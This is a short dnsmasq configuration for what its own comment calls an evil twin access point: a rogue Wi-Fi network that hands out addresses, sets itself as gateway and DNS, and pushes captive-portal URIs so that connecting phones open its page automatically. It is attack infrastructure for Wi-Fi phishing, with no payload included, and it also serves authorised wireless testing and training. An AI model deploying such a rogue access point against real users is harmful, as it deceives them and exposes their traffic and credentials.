# dnsmasq - DHCP server and DNS forwarder for the evil twin AP

interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,1h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-option=15,guess.com

# RFC 8910 - captive portal URI for Android 11+ and iOS 14+
# Devices read this URL from DHCP and open the portal automatically
dhcp-option=114,"http://10.0.0.1/"

# RFC 7710 - older captive portal URI option (Android 9-10)
dhcp-option=160,"http://10.0.0.1/"

# Upstream DNS server used for anything we do not handle ourselves
server=8.8.8.8

log-queries
log-dhcp
